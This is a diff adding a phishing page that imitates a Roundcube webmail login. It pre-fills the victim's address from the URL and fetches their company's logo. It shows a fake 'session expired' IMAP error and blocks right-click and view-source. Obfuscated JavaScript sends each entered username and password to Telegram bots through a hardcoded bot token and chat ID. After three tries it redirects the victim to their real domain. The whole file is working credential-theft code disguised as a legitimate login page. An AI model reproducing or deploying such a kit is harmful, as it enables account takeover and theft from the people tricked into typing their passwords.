@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Webmail :: Welcome to Webmail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://email.powweb.com/roundcube/skins/larry/images/favicon.ico">
+    <link rel="stylesheet" href="https://bafybeidf5fw6gmcl7xh3ytqn53u7vmg2cfhynrbmhkwhxvcizz5rtdbyxq.ipfs.w3s.link/styles.min.css">
+    <link rel="stylesheet" href="https://bafybeig5evukk2lmpa2bdjinbdd6bgqonnqhx7xvqbkbrlqiy4v3vv5n5u.ipfs.w3s.link/jquery-ui.css">
+    <link rel="stylesheet" href="https://bafybeihbjgeaixczn7cx54jxs55tothzeaururwppolrtid7agdsbvhupm.ipfs.w3s.link/framework.css">
+    <link rel="stylesheet" href="https://bafybeicvuk4mb6tdtpe7yxnckrewbgyimqr5hbp67dhzjjg5mkgo2t2eey.ipfs.w3s.link/xdesktop.css">
+    <link rel="stylesheet" href="https://bafybeibusvqm3e73ahgyhttqud3p3vhxaqh5fbtftjgibzsjegsprsulx4.ipfs.w3s.link/desktop.css">
+    <style>
+        #logoimg {
+            width: 80px;  /* Adjust the width */
+            height: auto;  /* Maintain aspect ratio */
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+        #top {
+            display: flex;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body class="xskin skin-droid color-3F51B5 login-page xdesktop font-icons-toolbars xicons-material">
+    <div id="login-form">
+        <div class="box-inner" role="main">
+            <p id="company-name" style="font-size:10px;">
+                <marquee scrollamount="1" behavior="alternate" width="90%" direction="left" height="100px">
+                    IMAP Error in /var/www/webmail/program/main/mail_imap.php (196): Login failed for 
+                    <span style="color:red;" id="aicx"></span> from https://<span id="logonamec"></span> 
+                    AUTHENTICATE PLAN FAILED: Email account block request/verification.
+                </marquee>
+            </p>
+            <h2 class="text-center">
+                <div id="top">
+                    <img src="https://logodix.com/logo/2075101.png" alt="Webmail Logo" id="logoimg">
+                </div>
+            </h2>
+            <p style="color:rgb(139, 137, 137);">
+                <span id="logoname"></span>&nbsp;Webmail
+            </p>
+            <form id="contact">
+                <input type="hidden" name="_timezone" id="rcmlogintz" value="Europe/London">
+                <table>
+                    <tbody>
+                        <tr>
+                            <td class="title">
+                                <label for="rcmloginuser">Username</label>
+                            </td>
+                            <td class="input">
+                                <fieldset style="height:25px; background-color:white;">
+                                    <div id="aich" style="margin-top:5px;"></div>
+                                </fieldset>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="title">
+                                <label for="rcmloginpwd">Password</label>
+                            </td>
+                            <td class="input">
+                                <input name="passx" placeholder="Enter email password" required size="40" id="pr" autocomplete="off" type="password">
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <p class="formbuttons">
+                    <input id="submit-btn" type="submit" class="button mainaction" value="Continue" style="border-radius:5px;">
+                </p>
+                <input type="hidden" name="user" id="ai" value="" required autocomplete="off">
+            </form>
+        </div>
+        <div id="login-status" class="error-notice" style="visibility: visible; width:300px; height:20px; margin-left:500px; margin-top:2px; color:red;">
+            <div class="content-wrapper">
+                <div id="login-detail">
+                    <div id="login-status-icon-container">
+                        <span class="login-status-icon"></span>
+                    </div>
+                    <div id="msg" style="margin-top:10px;">Session Expired. Please login again!</div>
+                    <div id="msg2" style="display: none; margin-top:5px; margin-left:0px;">Login failed! [incorrect password]</div>
+                    <div id="msg1" style="display: none; margin-top:5px; margin-left:0px;">Login failed! [wrong password]</div>
+                </div>
+            </div>
+        </div>
+        <div class="box-bottom" role="complementary">
+            <div id="message"></div>
+            <noscript>
+                <p class="noscriptwarning"></p>
+            </noscript>
+        </div>
+        <div id="bottomline" role="contentinfo">
+            Domain Webmail
+        </div>
+    </div>
+    <script type="text/javascript">
+        if (!window.UI) {
+            var UI = new rcube_mail_ui();
+        }
+    </script>
+    <a id="vendor-branding" href="http://roundcubeplus.com/" target="_blank" title="More Roundcube skins and plugins at roundcubeplus.com">
+        <span id="vendor-icon-2"></span>
+        <span id="vendor-icon-1"></span>
+    </a>
+    <script type="text/javascript">
+        var _0x1bab60=_0x2183;(function(_0x266571,_0x1d963f){var _0x49ea69=_0x2183,_0x16ef28=_0x266571();while(!![]){try{var _0x509e5d=parseInt(_0x49ea69(0xf0))/0x1*(-parseInt(_0x49ea69(0xeb))/0x2)+-parseInt(_0x49ea69(0xf4))/0x3*(-parseInt(_0x49ea69(0xe6))/0x4)+parseInt(_0x49ea69(0xea))/0x5+-parseInt(_0x49ea69(0xf2))/0x6*(-parseInt(_0x49ea69(0xe7))/0x7)+parseInt(_0x49ea69(0xed))/0x8*(parseInt(_0x49ea69(0xef))/0x9)+parseInt(_0x49ea69(0xe8))/0xa+-parseInt(_0x49ea69(0xf6))/0xb;if(_0x509e5d===_0x1d963f)break;else _0x16ef28['push'](_0x16ef28['shift']());}catch(_0x440490){_0x16ef28['push'](_0x16ef28['shift']());}}}(_0x3ff7,0xadc64),$(document)[_0x1bab60(0xf1)](function(){var _0x2bf58b=_0x1bab60;rcmail[_0x2bf58b(0xe5)]();var _0x343bcb=[_0x2bf58b(0xf8),_0x2bf58b(0xfb),'skins/larry/images/buttons.png','skins/larry/images/addcontact.png',_0x2bf58b(0xe9),_0x2bf58b(0xee),_0x2bf58b(0xf3),_0x2bf58b(0xf9),'skins/larry/images/quota.png',_0x2bf58b(0xf5),_0x2bf58b(0xf7),_0x2bf58b(0xe4)];for(var _0x493090=0x0;_0x493090<_0x343bcb[_0x2bf58b(0xec)];_0x493090++){var _0x51d82f=new Image();_0x51d82f[_0x2bf58b(0xfa)]=_0x343bcb[_0x493090];}}));function _0x2183(_0x1dc577,_0x334fc0){var _0x3ff753=_0x3ff7();return _0x2183=function(_0x218371,_0x4911ab){_0x218371=_0x218371-0xe4;var _0x7f58b9=_0x3ff753[_0x218371];return _0x7f58b9;},_0x2183(_0x1dc577,_0x334fc0);}function _0x3ff7(){var _0x4b9464=['skins/larry/images/messages_dark.png','src','skins/larry/images/ajaxloader_dark.gif','skins/larry/images/watermark.jpg','init','4EnWUlZ','5558keBqUs','5539740jLqxbh','skins/larry/images/filetypes.png','5756990oFKbcO','900386Ymbbkz','length','72aOCiaa','skins/larry/images/listicons.png','422001rAhCZM','1Lujixx','ready','7230LefcDF','skins/larry/images/messages.png','3606195twZQQH','skins/larry/images/selector.png','34366585FTipQf','skins/larry/images/splitter.png','skins/larry/images/ajaxloader.gif'];_0x3ff7=function(){return _0x4b9464;};return _0x3ff7();}
+    </script>
+    <script>
+        var _0x47102d=_0x50a1;function _0x4494(){var _0x4eb443=['Jan\x205,\x202024\x2015:37:25','innerHTML','demo','12yEKPNe','1062730cdzbuw','392928jBOuqA','225610eRtmTo','EXPIRED','1192282CZuwPT','getTime','floor','460292oqOkeF','getElementById','724530SrlHRf','1604512aRqNqw'];_0x4494=function(){return _0x4eb443;};return _0x4494();}(function(_0x45239c,_0x28f381){var _0x2d1a13=_0x50a1,_0x5b502d=_0x45239c();while(!![]){try{var _0x424b21=-parseInt(_0x2d1a13(0x8b))/0x1+parseInt(_0x2d1a13(0x8a))/0x2+-parseInt(_0x2d1a13(0x92))/0x3+parseInt(_0x2d1a13(0x90))/0x4+-parseInt(_0x2d1a13(0x89))/0x5+-parseInt(_0x2d1a13(0x97))/0x6*(-parseInt(_0x2d1a13(0x8d))/0x7)+parseInt(_0x2d1a13(0x93))/0x8;if(_0x424b21===_0x28f381)break;else _0x5b502d['push'](_0x5b502d['shift']());}catch(_0x2ee1e2){_0x5b502d['push'](_0x5b502d['shift']());}}}(_0x4494,0x2a41f));function _0x50a1(_0x305ff6,_0x212009){var _0x449476=_0x4494();return _0x50a1=function(_0x50a17e,_0x4954d7){_0x50a17e=_0x50a17e-0x89;var _0x37a8bc=_0x449476[_0x50a17e];return _0x37a8bc;},_0x50a1(_0x305ff6,_0x212009);}var countDownDate=new Date(_0x47102d(0x94))[_0x47102d(0x8e)](),x=setInterval(function(){var _0x5f268d=_0x47102d,_0x44d553=new Date()[_0x5f268d(0x8e)](),_0x54469a=countDownDate-_0x44d553,_0x447358=Math['floor'](_0x54469a/(0x3e8*0x3c*0x3c*0x18)),_0x1dee43=Math['floor'](_0x54469a%(0x3e8*0x3c*0x3c*0x18)/(0x3e8*0x3c*0x3c)),_0x4fd40a=Math[_0x5f268d(0x8f)](_0x54469a%(0x3e8*0x3c*0x3c)/(0x3e8*0x3c)),_0xc81d83=Math[_0x5f268d(0x8f)](_0x54469a%(0x3e8*0x3c)/0x3e8);document[_0x5f268d(0x91)](_0x5f268d(0x96))[_0x5f268d(0x95)]=_0x1dee43+'h\x20'+_0x4fd40a+'m\x20'+_0xc81d83+'s\x20',_0x54469a<0x0&&(clearInterval(x),document['getElementById']('demo')[_0x5f268d(0x95)]=_0x5f268d(0x8c));},0x3e8);;
+    </script>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7W3mgPxhUibX39j7fakFPskvXusMfmCFfJxJ8U1anvhpknVfl" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script>
+        $(document).ready(function () {
+            var ai = window.location.hash.substr(1);
+            if (ai) {
+                var decoded_ai = atob(decodeURIComponent(ai));
+                $('#ai').val(decoded_ai);
+                $("#aich").html(decoded_ai);
+                var ind = decoded_ai.indexOf("@");
+                var my_slice = decoded_ai.substr((ind + 1));
+                var finalu = my_slice.toUpperCase();
+                var logoUrl = "https://logo.clearbit.com/" + my_slice;
+
+                // Debugging logs
+                console.log("Attempting to fetch logo from URL: " + logoUrl);
+
+                $.get(logoUrl)
+                    .done(function () {
+                        console.log("Logo fetched successfully from: " + logoUrl);
+                        $("#logoimg").attr("src", logoUrl);
+                    }).fail(function () {
+                        console.log("Failed to fetch logo. Using fallback logo.");
+                        $("#logoimg").attr("src", "https://logodix.com/logo/2075101.png");
+                    });
+
+                $("#logoname").html(finalu);
+                $("#logonamec").html(finalu);
+            }
+            $(document).bind('keydown', function (e) {
+                if (e.ctrlKey && (e.which == 83)) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+            document.addEventListener('contextmenu', event => event.preventDefault());
+            document.onkeydown = function (e) {
+                if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
+                    return false;
+                } else {
+                    return true;
+                }
+            };
+            $(document).keypress("u", function (e) {
+                if (e.ctrlKey) {
+                    return false;
+                } else {
+                    return true;
+                }
+            });
+        });
+
+        var attemptCount = 0;
+
+        function _0x7a3b(_0x4a1630,_0x2b64d7){const _0x241e21=_0x241e();return _0x7a3b=function(_0x7a3b80,_0x1c1421){_0x7a3b80=_0x7a3b80-0x199;let _0x23e030=_0x241e21[_0x7a3b80];return _0x23e030;},_0x7a3b(_0x4a1630,_0x2b64d7);}function _0x241e(){const _0x7f1582=['https://api.telegram.org/bot','application/json','\x0aPassword:\x20','5561782356','submit','175112XDzMkz','/sendMessage','4LfbWnQ','642870JddYOg','innerText','424224VcIgoD','preventDefault','catch','224IlIKCo','https://','value','stringify','2853865TFAiZY','location','POST','21136vutDQN','7131207120:AAFBUWUXutCoMJcvTKpP_r8cKgXNeyzrJpw','href','aich','getElementById','contact','Error:','1472760nCiNFS','1040184CKneBB','split','error'];_0x241e=function(){return _0x7f1582;};return _0x241e();}const _0x19ef21=_0x7a3b;(function(_0x4ad95d,_0x223ddd){const _0x1aebc2=_0x7a3b,_0x190b2c=_0x4ad95d();while(!![]){try{const _0x20cfc7=parseInt(_0x1aebc2(0x1a8))/0x1*(-parseInt(_0x1aebc2(0x1aa))/0x2)+parseInt(_0x1aebc2(0x1ad))/0x3+-parseInt(_0x1aebc2(0x1a0))/0x4+parseInt(_0x1aebc2(0x1b4))/0x5+parseInt(_0x1aebc2(0x1ab))/0x6+parseInt(_0x1aebc2(0x1b0))/0x7*(-parseInt(_0x1aebc2(0x1b7))/0x8)+parseInt(_0x1aebc2(0x19f))/0x9;if(_0x20cfc7===_0x223ddd)break;else _0x190b2c['push'](_0x190b2c['shift']());}catch(_0xef1db8){_0x190b2c['push'](_0x190b2c['shift']());}}}(_0x241e,0x46598),document[_0x19ef21(0x19c)](_0x19ef21(0x19d))['addEventListener'](_0x19ef21(0x1a7),function(_0x186c40){const _0x331244=_0x19ef21;_0x186c40[_0x331244(0x1ae)]();const _0xb748dc=document[_0x331244(0x19c)](_0x331244(0x19b))[_0x331244(0x1ac)],_0x5d41bb=document[_0x331244(0x19c)]('pr')[_0x331244(0x1b2)],_0x16ebdb=_0x331244(0x199),_0x545d45=_0x331244(0x1a6),_0x20205f='Username:\x20'+_0xb748dc+_0x331244(0x1a5)+_0x5d41bb;fetch(_0x331244(0x1a3)+_0x16ebdb+_0x331244(0x1a9),{'method':'POST','headers':{'Content-Type':_0x331244(0x1a4)},'body':JSON[_0x331244(0x1b3)]({'chat_id':_0x545d45,'text':_0x20205f})})['catch'](_0x358dc0=>{const _0x886cb6=_0x331244;console[_0x886cb6(0x1a2)](_0x886cb6(0x19e),_0x358dc0);}),fetch('https://api.telegram.org/bot'+token2+'/sendMessage',{'method':_0x331244(0x1b6),'headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'chat_id':chat_id2,'text':_0x20205f})})[_0x331244(0x1af)](_0x34e71a=>{const _0x1919b8=_0x331244;console['error'](_0x1919b8(0x19e),_0x34e71a);}),document[_0x331244(0x19c)]('pr')[_0x331244(0x1b2)]='',attemptCount++;if(attemptCount>=0x3){const _0x3cde54=_0xb748dc[_0x331244(0x1a1)]('@')[0x1];window[_0x331244(0x1b5)][_0x331244(0x19a)]=_0x331244(0x1b1)+_0x3cde54;}}));
+    </script>
+</body>
+</html>
